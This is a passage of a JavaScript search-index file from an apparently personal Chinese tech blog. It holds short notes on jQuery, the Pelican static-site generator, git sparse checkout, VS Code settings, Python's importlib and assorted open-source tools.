var tipuesearch = {"pages":[{"title":"jQuery提供方法","text":"toggleClass() 对选择元素添加或移除指定的类. 语法 $ ( selector ). toggleClass ( classname , function ( index , currentclass ), switch ) 参数说明 classname 必需。规定添加或移除的一个或多个类名。如需规定若干个类，请使用空格分隔类名。 function(index,currentclass) 可选。规定返回需要添加/删除的一个或多个类名的函数。 index - 返回集合中元素的 index 位置。 currentclass - 返回被选元素的当前类名。 switch 可选。布尔值，规定是否仅仅添加（true）或移除（false）类。 如 $ ( \"button\" ). click ( function (){ $ ( \"p\" ). toggleClass ( \"main\" ); }); 当点击时, 如果 p 标签的类属性包含 main , 则移除 p 标签的类属性不包含 main , 则添加 hasClass() 判断是否存在某个类, 返回bool值 语法 $ ( selector ). hasClass ( classname ) 参数 classname 必需。规定需要在被选元素中查找的类。 如 $ ( \"button\" ). click ( function (){ alert ( $ ( \"p\" ). hasClass ( \"intro\" )); });","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-jquery-jQuery-provided-methods.html","loc":"/yq-doc-source-docs-front-end-frame-jquery-jQuery-provided-methods.html"},{"title":"记录将sphinx文档库迁移到pelican","text":"此前一直用的sphinx, 适合做文档教程, 一直写了几年个人文档. 进来觉得这些记录不适合做成文档教程, 想改成博客, 就有了以下... 前路历程 sphinx直接做成博客方案 找了很久这个, 后面找到一个 ablog 拓展, 可以直接配置在 sphinx 的 conf.py. 但是由于是基于 sphinx 的主题, 所以后续修改主题比较麻烦. 且内容较大时, 生成速度简直缓慢(sphinx本身的慢). 再加上博客本身不需要sphinx内置的文档结构生成. 故后面就放弃了 ablog . 简单搜索了下博客框架, 最后还是选择了 pelican pelican没有sphinx的专有指令/角色 这个问题一直困扰了很久, 因为此前一直用的 sphinx , 所以想当然认为像 toctree , literalinclude 等指令, doc , ref 等 role 是 rst 本身就支持的. 直到我构建的时候, 看报错才知道并非如此. github上看了下, 可能是之前没人有这样的历程吧, 压根没有现有解决方案. 最后, 自己把自己文档遇到的内容, 简单通过 pelican 插件处理了一下, 至于具体实现本身功能, 先这样弄, 后面慢慢来. pelican构建时模版翻译支持 这个也算是一个痛点, 模版是用的 Jinja 模版引擎. 此前虽然用过, 但没有系统搞过, 所以完全不知道国际化还需要安装插件. 之道遇到报错: _ undeifned 后面的解决方案是. 安装 jinja2 的必须插件 pip install jinja2-pluralize-extension 在 pelicanconf.py 中配置多语言插件 PLUGIN_PATHS = [ \"plugins\" ] PLUGINS = [ \"i18n_subsites\" , # 多语言 ] i18n_subsites 可以在官方github仓库下载, 地址: pelican-plugins/i18n_subsites vscode没有纯粹的指令联想插件 有个 rst 官方插件, 不过是依赖sphinx的. 计划后面写到vscode拓展支持... 搜索功能 看了下其他主题有搜索的是用的 tipue search 然后就加了这个插件, 也在官方仓库下载 PLUGINS = [ \"i18n_subsites\" , # 多语言 \"tipue_search\" , ] 插件github地址: https://github.com/pelican-plugins/tipue-search 然后还要配置js跟相应的css. 一开始我直接把别人老仓库的js拿过来, 改好主题后, 发现不支持中文搜索. 具体研究了下, 发现拿过来的是 3.0 的版本, 要用最新的 5.1 才行, 于是又去下好最新版, 修修改改, 终于支持了 中文搜索 可参考下载地址: https://cdnjs.com/libraries/Tipue-Search 图标 有些样式比如图标没法用原生html实现, 后面找到个 fontawesome 图标库, 但是全部引入感觉没必要, 因为我就用那么几个. 最后的措施是: 在 fontawesome 找好想要的图标 改下图标样式 复制图标的 svg, 保存到本地为图片使用. 另外找搜索图标的时候看到 用content来显示特殊图片的, 不过需要字体支持, 可参考: https://www.cnblogs.com/ninama/p/16019777.html 缺失源信息 主要就是 作者, 事件, 路径 等信息. 本来想看看文件的mktime, 但是发现可能是跟git交互的原因吧, 有git的同步啥的貌似会重新计算mk. 但是暂时也找不到其他方法, 就暂时只好用错误的mktime了. 其他信息写了个脚本来全部加.","tags":"文档","url":"/yq-doc-do-from-sp-to-pelican.html","loc":"/yq-doc-do-from-sp-to-pelican.html"},{"title":"仅克隆指定文件夹","text":"有时候想克隆某个仓库的指定的文件夹, 而非整个仓库 作为主模块 就是不会被其他仓库作为子仓库使用 创建一个与要clone的仓库同名或不同命的目录, 然后初始化仓库 mkdir content cd content git init 添加远程仓库源 git remote add origin git@xxx.git 最重要的一步来了, 设置Sparse Checkout 为true, 才能支持单独拉文件夹 git config core.sparsecheckout true 将 想要克隆的文件夹 相对 根目录 的路径写入配置文件. 比如source下两个docs1和docs2文件夹 echo \"source/docs\\nsource/docs2\" >> .git/info/sparse-checkout 然后再拉即可 git pull origin master 如果只想保留最新的文件而不要历史版本的文件，pull可以用git pull --dpeth 1命令，即\"浅克隆\"： $ git pull --depth 1 origin master 作为子模块 就是作为子仓库使用. 与上面差距不大. 不过由于路径原因, 需要先设置子仓库 在父仓库设置子仓库 git submodule add -b $branch_name -- git@xxx.git content 这个只是为了加到 .gitmodules , 手动改的话, 貌似有时候会有问题. 所以使用命令添加, 不过使用命令添加子仓库时, 会默认拉取所有信息. 这个时候的信息是全量的. 与上面 不作为子仓库 不同之处就在这, 先进仓库目录, 然后清空所有 如果介意这一点, 可以研究研究直接手动将信息增加到 .gitmodules 会不会有问题 后续指令 git remote add origin git@xxx.git git config core.sparsecheckout true echo \"source/docs\\nsource/docs2\" >> .git/info/sparse-checkout git pull origin $branch_name core.sparsecheckout作用 支持 稀疏检出 , 即 本地版本库检出时不检出全部 , 只将指定的文件从本地版本库检出到工作区 可参考: 稀疏检出和浅克隆","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-issuses-clone-only-folder.html","loc":"/yq-doc-source-docs-version-control-git-issuses-clone-only-folder.html"},{"title":"googletrans","text":"一个谷歌提供的翻译模块, 分多个版本, 实际测试可用的版本为 4.0.0-rc1 安装: # pip install googletrans==3.1.0a0 pip install googletrans == 4 .0.0-rc1 简单的翻译实现 translator = Translator () cache = {} def translate_from_ch_to_en ( text ) -> str : if text in cache : return cache [ text ] try : translation = translator . translate ( text , src = 'zh-CN' , dest = 'en' ) # return translation.text cache [ text ] = translation . text return cache [ text ] except Exception as e : print ( \"-0-0-\" , text , e ) raise e 一些预定义 googletrans.LANGUAGES 查看支持的语言种类","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-googletrans.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-googletrans.html"},{"title":"gnome刷新desktop缓存","text":"此前一直以为 update-desktop-database 可以直接刷新desktop缓存, 结果用的时候一直没有生效. 再仔细看了一下 update-desktop-database 的描述说到 构建 MIME types 的缓存数据库. 一口老血. 截止目前了解到刷新缓存的三种方式: 重启gnome 图形化界面可以按快捷键 ALT + F2 , 然后输入 restart 重启 用户重新登陆 即手动注销用户, 再重新登陆, 缺点就是注销会关闭用户前台打开程序 重启 遇事不决, 直接重启","tags":"linux","url":"/yq-os-linux-ubuntu-issues.html","loc":"/yq-os-linux-ubuntu-issues.html"},{"title":"Vscode文档相关插件.rst","text":"reStructuredText 相关资源 官网文档: https://docs.restructuredtext.net 提供了基于Sphinx的语法预览提示等支持, 但是缺点也是只支持Sphinx. 比如如果我用pelican创建的内容, 就只能在工程区 setting.json 配置个 { \"esbonio.server.enabled\" : false } 然后就只能用使用 docutil 预览功能. Table Formatter 表格快捷编写插件 还没搞懂咋用","tags":"文档","url":"/yq-doc-vs-plugin.html","loc":"/yq-doc-vs-plugin.html"},{"title":"Xcode是否配置证书的区别","text":"如 新版本的MacOS限制越来越严格了, 只有选择如图的开发者证书 才能在其他机器运行. 如果只是选择了 Run Local , 在以前操作一下还可以在其他机器跑, 现在也不行了","tags":"后端; swift","url":"/yq-backend-swift-xode-diff-with-or-no-cert.html","loc":"/yq-backend-swift-xode-diff-with-or-no-cert.html"},{"title":"配置项","text":"仅介绍部分, 全部的可见: 设置选项 EXTRA_PATH_METADATA 额外的静态资源拷贝路径 比如网站加入favicon.ico # 将extra文件夹下面的favicon.ico文件copy到output文件夹下面。 EXTRA_PATH_METADATA = { 'extra/favicon.ico' : { 'path' : 'favicon.ico' } } DEFAULT_CATEGORY 当不想在博客页显示定义分类时, 设置默认分类 DEFAULT_CATEGORY = 'others' USE_FOLDER_AS_CATEGORY 按照最近一层文件夹添加分类 不能与DEFAULT_CATEGORY共存 USE_FOLDER_AS_CATEGORY = True DEFAULT_PAGINATION 设置主页博客分页显示 如分每页最多显示10条博客记录. DEFAULT_PAGINATION = 10 如不需要分页, 设置为False即可 参考: pelican","tags":"文档","url":"/yq-doc-frame-pelican-conf.html","loc":"/yq-doc-frame-pelican-conf.html"},{"title":"主题模版与变量","text":"主要参考: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/themes.html 主题框架 必须遵循以下的文件结构: ├── static │ ├── css │ └── images └── templates ├── archives.html // 显示存档 ├── period_archives.html // 显示时间段存档 ├── article.html // 应用于每篇文章 ├── author.html // 应用于每个作者 ├── authors.html // 应用于所有作者 ├── categories.html // 列出所有分类 ├── category.html // 应用于每个分类 ├── index.html // 索引 (列出所有文章) ├── page.html // 应用于每个page页 ├── tag.html // 应用于每个标签 └── tags.html // 列出所有标签，可以是标签云 其中, static 包含所有静态资源，这些静态资源将被复制到输出目录的 theme 文件夹。 上述文件系统布局中包括CSS文件夹和图像文件夹，但这些只是示例。把你需要的放在这个目录下。 templates 包含将用于生成内容的所有模板。上面列出的模板文件是强制性的； 创建主题时如果有需要，你可以添加自己的模板文件。 模板和变量 自定义全局模版变量 只要设置文件中定义的变量拼写全大写，所有模板都将接收它们。 预定义全局模版变量 所有这些设置将适用于所有模板。 变量 描述 output_file 当前正在生成的文件的名称。例如，当pelican渲染主页，输 出文件output_file将为 \"index.html\" 。 articles 文章列表，按日期降序排序。 所有元素都是 Article 文章 对象，因此你可以访问它们的属性（例如标题、摘要、作者 等）。有时这些信息被隐去（比如在标签页）。不过你可以在 所有文章 all_articles 变量中找到有关的信息。 dates 同样是文章列表，不过按日期升序排序。 drafts 文章草稿列表。 authors 一个元组tuples（作者，文章）列表，包含所有作者和相应的文章（值）。 categories 一个元组tuples（分类，文章）列表，包含所有分类和相应的文章（值 ）。 tags 一个元组tuples（标签，文章）列表，包含所有标签和相应的文章（值 ）。 pages pages页面列表 hidden_pages 隐藏的pages页面列表 draft_pages pages页面草稿列表 排序 URL包装器（当前为分类、标签和作者），内含比较方法，可以很方便地按名称排序 {% for tag , articles in tags | sort %} 相关jinja命令可参考 https://jinja.palletsprojects.com/templates/#sort 格式化日期 可以直接设置 DATE_FORMATS/DEFAULT_DATE_FORMAT 以及 locale_date 属性以供你对日期进行格式化设置 可以此格式在模版中灵活使用 {{ article.date | strftime ( '%d %B %Y' ) }} 模板页index.html 用于生成博客主页或索引页 index.html 如果分页功能处于启用状态，则后续的页面将类似 index{number}.html 这种形式。 变量 描述 articles_paginator 文章列表的分页对象 articles_page 文章的当前页码 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name ‘index' – 用于分页链接 模板页author.html 此模板将应用于每个作者，根据 AUTHOR_SAVE_AS 设置 (默认值: author/{slug}.html) 生成输出。 如果分页功能处于启用状态，则后续的页面默认类似为 author/{slug}{number}.html 这种形式。 变量 描述 author 作者姓名 articles 作者的文章 dates 作者的文章，按日期升序排序 articles_paginator 文章列表的分页对象 articles_page 文章的当前页面 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name AUTHOR_URL 其中 {slug} 之后的所有内容都被删除 - 对于分页链接有用 模板页category.html 此模板将应用于每个现有类别，根据 CATEGORY_SAVE_AS 设置 (默认值: category/{slug}.html) 生成输出。 如果分页功能处于启用状态，则后续的页面默认类似为 category/{slug}{number}.html 这种形式。 变量 描述 category 分类名 articles 分类文章 dates 分类的文章，按日期升序排序 articles_paginator 文章列表的分页对象 articles_page 文章的当前页面 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name CATEGORY_URL，其中 {slug} 之后的所有内容都被删除 - 对于分页链接有用 模板页article.html 此模板将应用于每篇文章, 根据 ARTICLE_SAVE_AS 设置 (默认值: {slug}.html) 生成输出。 可以使用以下变量。 变量 描述 article 显示的文章 category 当前文章的分类名称 在文章源文件头部区域添加的任何元数据都将被视为 article 对象的字段。 字段名称将与元数据所用的名称相同，不过是采用 小写字母形式 。 例如，你可以在文章元数据中添加一个 FacebookImage 的字段，如下所示: Title: I love Python more than music Date: 2013-11-06 10:06 Tags: personal, python Category: Tech Slug: python-je-l-aime-a-mourir Author: Francis Cabrel FacebookImage: http://franciscabrel.com/images/pythonlove.png 这个新的元数据将作为 article.facebookimage 在 article.html 模板中提供调用。 例如,这允许你为Facebook的公开图形标签指定一张图片，该图片随每篇文章而不同 <meta property=\"og:image\" content=\" {{ article.facebookimage }} \"/> 模板页page.html 此模板将应用于每个page页面， 根据 PAGE_SAVE_AS 设置 (默认值: pages/{slug}.html) 生成输出。 可以使用以下变量。 变量 描述 page 显示的页面对象。你可以访问其标题、slug和内容。 模板页tag.html 此模板将应用于每个标签tag，根据 TAG_SAVE_AS 设置 (默认值: tag/{slug}.html) 生成输出。 如果分页功能处于启用状态，则后续的页面默认类似为 tag/{slug}{number}.html 这种形式。 变量 描述 tag 标签名称 articles 与此标签相关的文章 dates 与此标签相关的文章，按日期升序排序 articles_paginator 文章列表的分页对象 articles_page 文章的当前页面 articles_previous_page 文章的前一页(如果页面不存在，则为\"无\") articles_next_page 文章的下一页(如果页面不存在，则为\"无\") dates_paginator 文章列表的分页对象，按日期升序排序 dates_page 文章的当前页，按日期升序排序。 dates_previous_page 文章的前一页，按日期升序排序(如果页面不存在，则为\"无\") dates_next_page 文章的下一页，按日期升序排序(如果页面不存在，则为\"无\") page_name TAG_URL 其中 {slug} 之后的所有内容都被删除 模板页period_archives.html 这个模板页面，如果定义了 YEAR_ARCHIVE_SAVE_AS 的路径，则按年份处理输出文章， 如果定义了 MONTH_ARCHIVE_SAVE_AS ，则按月份，定义 DAY_ARCHIVE_SAVE_AS 按天数。 变量 描述 period 一个元组tuple(年 月 日)，表示当前时间段。 年 和 日 格式是数字，而 月 是字符串。 当时间段给定只有年份时，此元组也才只包含 年 。 如果时间段给定有年和月等，元组将包含 年 和 月 。 对象 详细说明模板中可用且有用的对象属性。这里并没有列出所有的属性，这里选择性地列出模板中通常会用到的属性。 文章 这里'文章'的表述基于 source_path 属性的字符串值。 属性 描述 author 文章的 作者 authors 文章的 作者 列表 category 文章的 分类 content 文章渲染内容 date 表示文章日期的日期时间对象 date_format 默认日期格式或区域设置日期格式 default_template 默认模板名称 in_default_lang 表示文章是否采用默认语言编写的布尔值 lang 文章所用语言 locale_date 按 date_format 格式化的日期 metadata 文章头部元数据 dict save_as 保存文章页的位置 slug 页面的slug内容 source_path 文章源文件的完整系统路径 relative_source_path 基于 PATH 的文章源文件的相对路径 status 文章状态，可以是'已发布'或'草稿' summary 展示的摘要内容 tags 标签 对象列表 template 使用的模板名称 title 文章标题 translations 翻译 文章 对象列表 url 文章页的URL 作者 / 分类 / 标签 这里三个对象的表述基于 name 属性的字符串值。 变量 描述 name 对象的名称 [1] page_name 作者页面名称 save_as 保存作者页面的位置 slug 页面的slug内容 url 作者页的URL [1] 对于 Author 对象, 来自 :authors: or AUTHOR. 页面Page 这里'页面page'的表述基于 source_path 属性的字符串值。 变量 描述 author 该页 作者 content 页面渲染内容 date 表示page页日期的日期时间对象 date_format 默认日期格式或区域设置日期格式 default_template 默认模板名称 in_default_lang 表示文章是否采用默认语言编写的布尔值 lang 文章所用语言 locale_date 按 date_format 格式化的日期 metadata 文章头部元数据 dict save_as 保存page页的位置 slug page页的slug内容 source_path page页源文件的完整系统路径 relative_source_path 基于 PATH 的page页源文件的相对路径 status page页状态，可以是'已发布'、'隐藏'或'草稿' summary 展示的摘要内容 tags 标签 对象列表 template 使用的模板名称 title page页标题 translations 翻译 文章 对象列表 url page页的URL Feeds订阅源 feed变量在版本3.0中发生更改。 每个变量现在都在名称中明确指出是ATOM还是RSS。 ATOM仍然是默认值。 旧主题需要对此进行更新。 下面是feed变量的一个完整列表: FEED_ATOM FEED_RSS FEED_ALL_ATOM FEED_ALL_RSS CATEGORY_FEED_ATOM CATEGORY_FEED_RSS AUTHOR_FEED_ATOM AUTHOR_FEED_RSS TAG_FEED_ATOM TAG_FEED_RSS TRANSLATION_FEED_ATOM TRANSLATION_FEED_RSS","tags":"文档","url":"/yq-doc-frame-pelican-theme-template.html","loc":"/yq-doc-frame-pelican-theme-template.html"},{"title":"评论-分析统计支持","text":"通过配置文件引入即可. 主要通过以下两个变量 # 评论支持 DISQUS_SITENAME = \"\" # 分析统计支持 GOOGLE_ANALYTICS = \"\" 分析统计国内可以使用 友言 , 多说 , 百度统计","tags":"文档","url":"/yq-doc-frame-pelican-issuse-dis.html","loc":"/yq-doc-frame-pelican-issuse-dis.html"},{"title":"文档","text":"相关资源: 时区缩写对照表: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones","tags":"文档","url":"/yq-doc.html","loc":"/yq-doc.html"},{"title":"Jekyll","text":"基于 ruby","tags":"文档","url":"/yq-doc-fram-Jekyll.html","loc":"/yq-doc-fram-Jekyll.html"},{"title":"nikola","text":"基于Python的文档框架, 支持rst, 貌似比较冷门 相关资源: github仓库: https://github.com/getnikola/nikola.git 官方文档: https://getnikola.com/documentation.html 第三方简单使用: https://blog.jiangfuquan.com/posts/nikola-blog/","tags":"文档","url":"/yq-doc-fram-nikola.html","loc":"/yq-doc-fram-nikola.html"},{"title":"文档托管平台","text":"提供此功能站点包括但不仅限于 码云 https://gitee.com/help/articles/4136#article-header0 , 托管需要实名认证(需上传手持证件), 放弃. github https://docs.github.com/zh/pages/getting-started-with-github-pages coding 待补充...","tags":"文档","url":"/yq-doc-page.html","loc":"/yq-doc-page.html"},{"title":"sugar-blog","text":"sugar-blog 是一个基于TS开发的前端博客模版框架 相关资源 github地址: https://github.com/ATQQ/sugar-blog 文档: https://theme.sugarat.top","tags":"文档","url":"/yq-doc-fram-sugar-blog.html","loc":"/yq-doc-fram-sugar-blog.html"},{"title":"将Sphinx项目转换为Blog","text":"使用 ABlog 插件 相关资源: github地址: https://github.com/sunpy/ablog 英文文档: ABlog for Sphinx 第三方中文文档: ABlog 用于 Sphinx","tags":"文档","url":"/yq-doc-fram-sphinx-sp-to-blog.html","loc":"/yq-doc-fram-sphinx-sp-to-blog.html"},{"title":"Docutils支持指令","text":"原生Docutils支持指令见 https://docutils.sourceforge.io/docs/ref/rst/directives.html","tags":"文档","url":"/yq-doc-lan-rst-directives.html","loc":"/yq-doc-lan-rst-directives.html"},{"title":"markdown","text":"官网主页: https://daringfireball.net/projects/markdown/","tags":"文档","url":"/yq-doc-lan-md.html","loc":"/yq-doc-lan-md.html"},{"title":"reStructuredText","text":"最初貌似是专为Python文档提供的一种标记语言 相关资源: 官网主页: https://docutils.sourceforge.io/rst.html#user-documentation 三方使用教程: Create Documentation with RST, Sphinx, Sublime, and GitHub 在Python中, 是 Docutils 提供了解析支持 指令支持 原生Docutils支持指令见 Docutils支持指令 拓展 看到个叫 MyST 的拓展, 看描述是整合了 markdown 和 rst, 参考: MyST","tags":"文档","url":"/yq-doc-lan-rst.html","loc":"/yq-doc-lan-rst.html"},{"title":"launch.json配置","text":"如何引入系统环境变量 使用 ${env:XXX} , 如想在系统的PATH前增加某些路径 再传下去 { \"version\" : \"0.2.0\" , \"configurations\" : [ { \"name\" : \"Launch\" , //.. \"env\" : { \"PATH\" : \"/usr/local/xxx:${env:PATH}\" }, \"args\" : [], \"preLaunchTask\" : \"setupEnv\" , } ] }","tags":"工具软件","url":"/yq-util-vscode.html","loc":"/yq-util-vscode.html"},{"title":"vscode下jinja版本html格式化","text":"使用 djLint 插件 在 settings.json 全局配置 \"[html][django-html][handlebars][hbs][mustache][jinja][jinja-html][nj][njk][nunjucks][twig]\" : { \"editor.defaultFormatter\" : \"monosans.djlint\" }, 其他相关插件: Jinja语法提示: Jinja Snippets 参考: https://segmentfault.com/q/1010000043305483","tags":"工具软件","url":"/yq-jinja-format.html","loc":"/yq-jinja-format.html"},{"title":"vscode的正则替换","text":"有时候想批量多文件一起替换. 正则使用此处不做表, 主要是vscode怎么用, 对于搜索区域正则组(即加了括号)的内容, 按照顺序, 在替换区域的引用按照顺序, 依次为 $1 , $2 ... 如对所有 do some 后面指定内容加后缀. 搜索区: do some([a-z]*) 替换区: do some$1_xxx","tags":"工具软件","url":"/yq-util-vscode-re.html","loc":"/yq-util-vscode-re.html"},{"title":"创建pelican项目","text":"先安装模块 pip install pelican 快速创建 mkdir blog-pro cd blog-pro pelican-quickstart 编译文档 pelican content 启动到本地 pelican --listen 如果希望监听文件更新, 实时刷新 pelican --autoreload --listen","tags":"文档","url":"/yq-doc-pelican-create.html","loc":"/yq-doc-pelican-create.html"},{"title":"插件","text":"官方有一个插件集合仓库: https://github.com/getpelican/pelican-plugins","tags":"文档","url":"/yq-doc-pelican-plugins.html","loc":"/yq-doc-pelican-plugins.html"},{"title":"主题使用","text":"相关资源: 官方主题集合仓库: https://github.com/getpelican/pelican-themes 仓库主题预览: https://pelicanthemes.com 使用开源/他人主题 可以将官方主题仓库集合clone到本地, 然后直接在 pelicanconf.py 定义想要用的 THEME = \"theme-name\" 也可以直接使用 pelican-themes 指令 比如安装 flex 主题 注解 不管用哪个都需要本地有 查看本地已经安装到pelican的主题 pelican-themes -l # 加 -v 可以查看安装路径 # pelican-themes -v -l 自定义主题 可参考: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/themes.html 除了配置 THEME , 启动时候可以指定使用某个主题启动 pelican content -s pelicanconf.py -t /projects/your-site/themes/your-theme","tags":"文档","url":"/yq-doc-pelican-theme.html","loc":"/yq-doc-pelican-theme.html"},{"title":"关于vscode-python插件","text":"插件github地址: https://github.com/microsoft/vscode-python 此插件提供了对Python相关的支持 问题 在 Ubuntu 20 下, 安装自行打包的 Python3.7 后, 无法在 theia 中使用, vscode-python 报错: The Python path in your debug configuration is invalid. 原因 自行打包的 Python3.7 , 而20对应的是 Python3.8 自行安装的 Python3.7 , 需要配置环境变量比如PATH, LD等 需要设置的环境变量无法给到插件里去, 除非在theia启动时就给, 或者直接全局设置 源码调用 对于Python相关调用, 库位置放在 python_files 目录下, 最主要获取执行文件信息使用的是 python_files/interpreterInfo.py import json import sys obj = {} obj [ \"versionInfo\" ] = tuple ( sys . version_info ) obj [ \"sysPrefix\" ] = sys . prefix obj [ \"sysVersion\" ] = sys . version obj [ \"is64Bit\" ] = sys . maxsize > 2 ** 32 在ts中的调用大致在 src/client/pythonEnvironments/common/externalDependencies.ts export async function shellExecute ( command : string , options : ShellOptions = {}) : Promise < ExecutionResult < string >> { const useWorker = false ; const service = await internalServiceContainer . get < IProcessServiceFactory > ( IProcessServiceFactory ). create (); options = { ... options , useWorker }; return service . shellExec ( command , options ); } 没有提供设置环境变量的方式","tags":"前端","url":"/yq-frontend-vscode-python.html","loc":"/yq-frontend-vscode-python.html"},{"title":"pelican","text":"pelican 是一个比较方便的开源的静态博客生成的框架. 基于Python 安装: python -m pip install pelican 在接触 pelican 之前, 一直使用的是 Sphinx , 但是 Sphinx 的侧重点在于 教程文档的生成. 而非博客, 虽然后 ABlog 拓展可以让其看起来类似博客, 但个人以为, 专用的事就交给专用的框架吧. 注解 另一方面, Sphinx 提供的功能比较强大, 但是, 迁移很麻烦. 一些相关资源: 官方仓库: https://github.com/getpelican/pelican 官方文档(英): https://docs.getpelican.com/en/latest/index.html 第三方中文文档: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/publish.html 简单使用见 创建pelican项目 主题 见 pelican主题 插件 见 pelican插件 引用本地文档 Pelican提供了一个特殊变量 {filename} ， 指代当前文件的路径, 比如我有一个如下结构的文档: content/文档/文本标记语言/reStructuredText ├── Docutils支持指令.rst └── index.rst 我想在 index 中引用 Docutils支持指令 , 那么这样写即可 `引用的说明:Docutils支持指令 <{filename}./Docutils支持指令.rst> `_ 前面的 引用的说明:Docutils支持指令 建议自定义加上, 否则页面显示的就是后面的纯文本了, 不好看. 另外引用的文件必须带后缀, 如果只是 `引用的说明:Docutils支持指令 <{filename}./Docutils支持指令> `_ (无后缀)则无法识别. 可能遇见的问题 评论-分析统计支持","tags":"文档","url":"/yq-doc-pelican.html","loc":"/yq-doc-pelican.html"},{"title":"一些开源便利的Git项目","text":"alist 文件云盘存储项目: https://github.com/alist-org/alist/tree/main latest Mac端更新软件工具: 官网: https://github.com/mangerlahn/latest 软件旁边有个图标 appStore 图标 表示从 AppStore 下载安装 啤酒 图标 表示从 HomeBrew 下载安装 小星星 图标 表示从 官网 下载安装 KeyboardShortcuts Mac下三方库: https://github.com/sindresorhus/KeyboardShortcuts 支持便捷的快捷键配置, 但是不支持配置的快捷键执行默认行为 listen1_desktop 开源音乐播放器, 桌面版 https://github.com/listen1/listen1_desktop 实际核心是一个chrome拓展, 用electron包了一下 官网: https://listen1.github.io/listen1/ frida 支持跨平台的hook, 比如侵入到一个dll内根据偏移获取内存信息 地址: https://github.com/frida/frida Gitee地址: https://gitee.com/wenph/frida frida-wechat-sticker 地址: https://github.com/K265/frida-wechat-sticker/tree/main 22年的时候可用于Windows下微信表情包提取, 现在不知道 amis 地址: https://github.com/baidu/amis 百度开源低代码框架, 前端 healthchecks cron 这种定时任务管理器, 是一个开源Django项目, 能在Crontab失效的时候通知 官网: https://healthchecks.io 在运维中, 当你的Crontab中的任务数超过10个的时候， 你会发现这些任务管理起来非常困难。尤其是当这些Cron任务执行失败的时候 克隆: git clone https://github.com/healthchecks/healthchecks.git 它通过一个回调接口判断你的Crontab任务有没有顺利执行。 比如说你有一个python脚本定时执行，healthchecks给定的回调URL是: http://localhost:8000/ping/880cb4d 在配置Crontab脚本的时候，就需要这么写: 8 6 * * * python /home/user/test.py && curl -fsS -m 10 --retry 5 -o /dev/null http://localhost:8000/ping/880cb4d2 如果未按时调用回调接口，healthchecks将会通过邮件等通知方式告警。 hyper 一个基于electron的终端工具. 跨平台. 官网: https://hyper.is github: https://github.com/vercel/hyper furo 见 /docs/后端/python/python三方库/furo 待处理 EMBY 一个媒体服务器, 介绍可看: https://zhuanlan.zhihu.com/p/629282288","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Some-open-source-and-convenient-GIT-projects.html","loc":"/yq-doc-source-docs-Chaotic-Some-open-source-and-convenient-GIT-projects.html"},{"title":"importlib","text":"官网: https://docs.python.org/zh-cn/3/library/importlib.html 实现了import部分功能及动态导入 这里仅介绍主要的几个 import_module():导入模块,返回模块对象。 find_loader():根据模块名称查找其加载器(loader),用于动态导入。 load_module():使用加载器加载模块,返回模块对象。 reload():重载已加载的模块。 get_module():根据模块对象获取模块信息。 __import__ 注解 程序式地导入模块应该使用 import_module() 而不是这个函数。 import_module find_loader invalidate_caches reload metadata metadata.entry_points 位置: from importlib.metadata import entry_points 通过参数 group 或者 name, 找到所有匹配的已安装包的入口. 关于loader加载器 在Python的importlib包中,加载器(Loader)是用来加载模块的对象。它包含了导入模块所需要的逻辑和信息。 主要有以下几种加载器: SourceFileLoader:从源文件(.py文件)加载模块。 PyLoader:从编译好的模块文件(.pyc文件)加载模块。 PackageLoader:从包中加载子模块。 ExtensionFileLoader:从扩展模块(.so/.pyd文件)加载模块。 ImpLoader:兼容Import模块的加载器,用于从已编译好的模块加载模块。 等等。 加载器具有以下方法: exec_module(module):执行模块的模块体代码,initialize模块对象。 load_module(fullname):加载模块,返回模块对象。 get_code(fullname):获取模块的代码对象。 get_source(fullname):获取模块的源代码。 is_package(fullname):判断模块是否是包。 get_filename(fullname):获取模块的文件名。 通过这些方法,加载器实现了导入模块的主要逻辑。 例如,SourceFileLoader可以从源文件读取代码并执行,返回模块对象。 在importlib中,find_loader()函数通过模块名称找到相应的加载器。 然后我们可以调用加载器的load_module()方法加载该模块。例如: import importlib.util name = 'example' loader = importlib.util.find_loader(name) module = loader.load_module(name) 这里我们找到example模块的加载器loader,然后通过loader加载example模块,获得模块对象module。 eg, 模块导入: module = importlib.import_module('math') print(module.sqrt(16)) # 4.0 获取模块信息: name = 'os' loader = importlib.find_loader(name) module = loader.load_module(name) print(module.__file__) print(module.__package__)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-importlib.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-importlib.html"},{"title":"Python标准库","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-index.html"},{"title":"pelican","text":"静态博客文档生成 注解 之前一直用的sphinx, 貌似最兼容的普通文档. 安装: pip install pelican","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-pelican.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-pelican.html"},{"title":"furo","text":"一个开源的sphinx主题. 默认的效果大概这样 安装: pip install furo github地址: https://github.com/pradyunsg/furo?tab=readme-ov-file 文档: 